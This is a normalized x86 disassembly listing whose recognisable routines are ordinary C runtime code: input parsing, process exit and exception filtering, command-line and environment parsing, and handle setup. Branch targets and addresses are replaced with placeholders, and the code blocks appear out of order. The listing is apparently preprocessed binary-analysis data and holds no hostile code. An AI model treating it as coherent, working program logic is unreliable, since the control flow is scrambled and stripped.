cmp [ ebp - 0x30 ] 0x0
je r-xdata
dec [ ebp - 0xc ]
jne r-xdata
mov edi rw-data
mov [ ebp - 0x16 ] 0x1
sub eax 0x3
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
inc [ ebp - 0xc ]
mov [ ebp - 0x20 ] 0x1
jle r-xdata
cmp [ ebp - 0xf ] 0x0
jne r-xdata
cmp [ ebp - 0xf ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_407b9c
pop ecx
mov ebx eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov dl [ ebp - 0x35 ]
cmp [ edi ] 0x5d
jne r-xdata
mov ebx [ ebp - 0x14 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
mov edi rw-data
jmp r-xdata
mov [ ebp - 0x16 ] 0x1
movzx eax [ ebx ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
cmp esi 0x67
jle r-xdata
cmp [ ebp - 0x17 ] 0x0
je r-xdata
cmp esi 0x78
je r-xdata
cmp [ ebp - 0x17 ] 0x0
je r-xdata
cmp esi 0x78
jne r-xdata
mov [ ebp - 0xf ] 0x1
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
inc edi
cmp al 0x2d
jne r-xdata
mov dl 0x5d
inc edi
mov [ ebp - 0x59 ] 0x20
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x17 ] 0x1
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
or [ ebp - 0x18 ] 0xff
dec [ ebp - 0x15 ]
cmp [ ebp - 0xe ] 0x0
jne r-xdata
mov ebx [ ebp - 0x14 ]
lea esi [ ebp - 0x1c4 ]
cmp ebx 0x2d
jne r-xdata
cmp esi 0x69
je r-xdata
cmp esi 0x46
jne r-xdata
neg edi
cmp [ rw-data ] 0x1
jle r-xdata
cmp esi 0x70
je r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
neg eax
adc ecx 0x0
mov [ ebp - 0x28 ] eax
neg ecx
mov [ ebp - 0x24 ] ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0x3c ] 0x7b
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x64 ]
or [ eax ] bl
jmp r-xdata
test dl dl
je r-xdata
mov al [ edi ]
cmp al 0x5d
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0xc ]
jne r-xdata
mov edi [ ebp + 0xc ]
inc edi
mov [ ebp + 0xc ] edi
cmp [ edi ] 0x5e
jne r-xdata
mov [ ebp - 0x16 ] 0x1
inc [ ebp - 0x15 ]
inc [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x44 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1c4 ] bl
lea esi [ ebp - 0x1c3 ]
jmp r-xdata
push 0x64
pop esi
cmp esi 0x6e
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] 0x0
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x80
push 0x80
push ebx
call sub_406333
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_406333
pop ecx
pop ecx
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x80
push 0x80
push ebx
call sub_406333
pop ecx
pop ecx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ ebp - 0x2c ]
dec [ ebp - 0x4 ]
push edi
push [ ebp - 0x14 ]
mov [ ebp - 0x30 ] esi
call sub_407bb6
pop ecx
pop ecx
mov [ ebp + 0xc ] edi
mov cl [ edi ]
cmp cl 0x5d
je r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_407b9c
mov ebx eax
pop ecx
cmp bl 0x78
mov [ ebp - 0x14 ] ebx
je r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_407b9c
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push 0x20
lea eax [ ebp - 0x64 ]
push 0x0
push eax
call sub_405cd0
add esp 0xc
cmp [ ebp - 0x3c ] 0x7b
jne r-xdata
mov eax edi
lea edi [ eax + 0x1 ]
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov edi [ ebp + 0x8 ]
dec [ ebp - 0xc ]
inc [ ebp - 0x4 ]
push edi
call sub_407b9c
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
cmp [ ebp - 0xe ] 0x0
mov edi [ ebp - 0x4 ]
je r-xdata
cmp [ ebp - 0xe ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push ebx
call sub_407bb6
pop ecx
pop ecx
push ebx
shl edi 0x4
call sub_407b65
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
test eax eax
je r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_406333
pop ecx
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push ebx
call sub_407bb6
pop ecx
pop ecx
cmp esi 0x6f
jne r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
push 0x4
pop ecx
call sub_40a200
push ebx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
call sub_407b65
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
test eax eax
je r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_407b9c
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0x14 ] eax
je r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
inc edi
cmp dl cl
jae r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_407b9c
pop ecx
mov ebx eax
mov [ ebp - 0x14 ] ebx
push 0x78
jmp r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0xf ] 0x1
jmp r-xdata
mov [ ebp - 0xc ] 0x15d
cmp [ ebp - 0xc ] 0x15d
jle r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x34 ]
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_407b9c
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
dec [ ebp - 0xc ]
je r-xdata
cmp esi 0x6f
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0xa
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
call sub_4063b0
cmp ebx 0x38
jge r-xdata
inc [ ebp - 0x1c ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x28 ] eax
adc [ ebp - 0x24 ] edx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
dec [ ebp - 0x4 ]
push edi
push eax
call sub_407bb6
pop ecx
pop ecx
mov ecx eax
push 0x1
and ecx 0x7
pop edx
movsx ebx [ ebp - 0x18 ]
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x64 ]
xor ecx ebx
test ecx edx
je r-xdata
cmp [ ebp - 0x30 ] esi
je r-xdata
mov al dl
mov dl cl
mov al cl
jmp r-xdata
pop esi
jmp r-xdata
cmp esi 0x78
mov [ ebp - 0x1c ] 0x1
je r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_406333
pop ecx
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
cmp [ ebp - 0xd ] 0x0
mov eax [ ebp - 0x2c ]
je r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
lea edi [ edi + edi * 4 ]
shl edi 0x1
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push [ ebp + 0x8 ]
inc [ ebp - 0x4 ]
call sub_407b9c
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
dec [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
push 0x3
pop ecx
call sub_40a200
jmp r-xdata
cmp [ ebp - 0xe ] 0x0
jne r-xdata
cmp [ ebp - 0xe ] 0x0
jne r-xdata
xor dl dl
jmp r-xdata
movzx edx dl
movzx esi al
sub esi edx
inc esi
cmp dl al
ja r-xdata
push [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
push ebx
call sub_407bb6
pop ecx
pop ecx
push 0x30
pop ebx
jmp r-xdata
push 0x6f
cmp [ rw-data ] bl
jne r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ eax ] di
mov [ eax ] edi
jmp r-xdata
inc [ ebp - 0x1c ]
cmp [ ebp - 0x20 ] 0x0
lea edi [ edi + ebx - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
inc [ ebp - 0x34 ]
cmp [ ebp - 0x3c ] 0x63
je r-xdata
inc [ ebp - 0x30 ]
jmp r-xdata
cmp [ ebp - 0x16 ] 0x0
je r-xdata
mov ecx edx
mov eax edx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x64 ]
or [ eax ] bl
inc edx
dec esi
jne r-xdata
mov [ ebp - 0x14 ] ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
inc [ ebp - 0x1c ]
mov [ esi ] bl
inc esi
inc [ ebp - 0x4 ]
push edi
call sub_407b9c
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
cmp [ ebp - 0x16 ] 0x0
mov eax [ ebp - 0x2c ]
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov [ esi ] al
inc esi
mov ecx [ rw-data ]
mov [ ebp - 0x38 ] al
movzx eax al
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
dec [ ebp - 0x4 ]
push edi
push ebx
call sub_407bb6
cmp [ ebp - 0x1c ] 0x0
pop ecx
pop ecx
je r-xdata
cmp ebx 0x65
je r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_407b9c
mov ebx eax
mov al [ rw-data ]
mov [ esi ] al
pop ecx
mov [ ebp - 0x14 ] ebx
inc esi
and [ eax ] 0x0
jmp r-xdata
and [ eax ] 0x0
jmp r-xdata
push [ rw-data ]
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x3e ]
push eax
call sub_40a0a7
mov ax [ ebp - 0x3e ]
add esp 0xc
mov [ esi ] ax
inc esi
inc esi
jmp r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_407b9c
pop ecx
mov [ ebp - 0x37 ] al
cmp [ ebp - 0xe ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
cmp ebx 0x45
jne r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_406333
pop ecx
pop ecx
jmp r-xdata
mov [ ebp - 0x2c ] esi
jmp r-xdata
inc [ ebp - 0x34 ]
and [ esi ] 0x0
lea eax [ ebp - 0x1c4 ]
push eax
movsx eax [ ebp - 0xd ]
push [ ebp - 0x2c ]
dec eax
push eax
call [ rw-data ]
add esp 0xc
jmp r-xdata
mov [ esi ] 0x65
inc esi
inc [ ebp - 0x4 ]
push edi
call sub_407b9c
mov ebx eax
pop ecx
cmp ebx 0x2d
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ esi ] al
inc esi
jmp r-xdata
inc [ ebp - 0x1c ]
mov [ esi ] bl
inc esi
inc [ ebp - 0x4 ]
push edi
call sub_407b9c
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x4
push 0x4
push ebx
call sub_406333
pop ecx
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
push edi
call sub_407b9c
mov ebx eax
pop ecx
mov [ ebp - 0x14 ] ebx
and [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ ebp - 0x1c ]
mov [ esi ] bl
inc esi
jmp r-xdata
sub_407b65
cmp [ rw-data ] 0x1
push esi
jle r-xdata
mov esi [ esp + 0x8 ]
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
mov esi [ esp + 0x8 ]
push 0x4
push esi
call sub_406333
pop ecx
pop ecx
jmp r-xdata
mov eax esi
pop esi
retn
and esi 0xffffffdf
sub esi 0x7
test eax eax
jne r-xdata
sub_407bcd
push esi
mov esi [ esp + 0x8 ]
push edi
push [ esp + 0x10 ]
inc [ esi ]
call sub_407b9c
mov edi eax
push edi
call sub_40a1cd
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax edi
pop edi
pop esi
retn
sub_407c40
push edi
call sub_407ce5
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_407cf7
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_407cee
pop edi
retn
push rw-data
push rw-data
call sub_407cf7
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_407d11
push ebp
mov ebp esp
push ecx
push ebx
push esi
call sub_40644b
mov esi eax
push [ esi + 0x50 ]
push [ ebp + 0x8 ]
call sub_407e4f
pop ecx
test eax eax
pop ecx
je r-xdata
push [ ebp + 0xc ]
call [ UnhandledExceptionFilter@IAT ]
mov ebx [ eax + 0x8 ]
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx 0x5
jne r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
push 0x1
pop eax
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x54 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
pop esi
pop ebx
leave
retn
and [ eax + 0x8 ] 0x0
push ecx
call ebx
pop ecx
mov edx [ rw-data ]
mov ecx [ rw-data ]
add ecx edx
push edi
cmp edx ecx
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x58 ]
cmp eax 0xc000008e
jne r-xdata
lea ecx [ edx + edx * 2 ]
shl ecx 0x2
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x58 ] 0x83
jmp r-xdata
mov edi [ esi + 0x50 ]
add ecx 0xc
and [ ecx + edi - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
cmp edx ebx
jl r-xdata
mov ebx [ ebp + 0x8 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x58 ] 0x81
jmp r-xdata
push [ esi + 0x58 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x58 ] edi
pop ecx
pop edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x58 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0x54 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x58 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x58 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x58 ] 0x86
jmp r-xdata
mov [ esi + 0x58 ] 0x8a
sub_407e4f
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
cmp [ edx ] esi
push edi
mov eax edx
je r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp eax ecx
jae r-xdata
lea edi [ ecx + ecx * 2 ]
lea edi [ edx + edi * 4 ]
xor eax eax
cmp [ eax ] esi
je r-xdata
cmp [ eax ] esi
jne r-xdata
pop edi
pop esi
retn
add eax 0xc
cmp eax edi
jae r-xdata
sub_407e89
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
mov al [ esi ]
cmp al 0x22
jne r-xdata
call sub_40a783
cmp al 0x20
jbe r-xdata
mov al [ esi + 0x1 ]
inc esi
cmp al 0x22
je r-xdata
mov al [ esi ]
test al al
je r-xdata
inc esi
cmp [ esi ] 0x20
ja r-xdata
cmp [ esi ] 0x22
jne r-xdata
test al al
je r-xdata
mov eax esi
pop esi
retn
cmp al 0x20
jbe r-xdata
inc esi
jmp r-xdata
movzx eax al
push eax
call sub_40a369
test eax eax
pop ecx
je r-xdata
inc esi
jmp r-xdata
sub_407ee1
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi [ rw-data ]
xor edi edi
call sub_40a783
lea eax [ edi * 4 + 0x4 ]
push eax
call sub_4070b4
mov esi eax
pop ecx
cmp esi ebx
mov [ rw-data ] esi
jne r-xdata
cmp al 0x3d
je r-xdata
mov edi [ rw-data ]
cmp [ edi ] bl
je r-xdata
push 0x9
call sub_4062ea
pop ecx
push esi
call sub_405b40
pop ecx
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
inc edi
push [ rw-data ]
call sub_40706c
pop ecx
mov [ rw-data ] ebx
mov [ esi ] ebx
pop edi
pop esi
mov [ rw-data ] 0x1
pop ebx
retn
push ebp
mov al [ esi ]
cmp al bl
je r-xdata
add edi ebp
cmp [ edi ] bl
jne r-xdata
push ebp
call sub_4070b4
cmp eax ebx
pop ecx
mov [ esi ] eax
jne r-xdata
push edi
call sub_405b40
mov ebp eax
pop ecx
inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_405950
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_4062ea
pop ecx
sub_407f9a
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_40a783
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_408033
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_4070b4
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_408033
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_4062ea
pop ecx
sub_408033
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_4081e7
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_4070b4
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_4070b4
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_405e30
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40706c
pop ecx
mov [ esp + 0x10 ] ebx
sub_408319
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push 0x480
call sub_4070b4
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x480 ]
push 0x1b
call sub_4062ea
pop ecx
lea eax [ ebp - 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ ebp - 0x16 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
and [ esi + 0x8 ] 0x0
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x24
add eax 0x480
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x4 ] eax
mov eax 0x800
cmp edi eax
jl r-xdata
mov ecx [ rw-data ]
lea eax [ ebx + ebx * 8 ]
cmp [ ecx + eax * 4 ] 0xffffffff
lea esi [ ecx + eax * 4 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] edi
jge r-xdata
mov edi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor esi esi
test edi edi
jle r-xdata
mov esi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
mov edi [ rw-data ]
add [ rw-data ] 0x20
mov [ esi ] eax
lea ecx [ eax + 0x480 ]
cmp eax 0x3
jne r-xdata
add [ ebp - 0x4 ] 0x4
inc esi
inc ebx
cmp esi edi
jl r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
add esi 0x4
cmp [ rw-data ] edi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov ecx [ esi ]
add eax 0x24
add ecx 0x480
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test al 0x8
jne r-xdata
push 0x480
call sub_4070b4
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
mov cl [ ebx ]
mov [ eax + 0x4 ] cl
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_4084d5
xor eax eax
push 0x0
cmp [ esp + 0x8 ] eax
push 0x1000
sete al
push eax
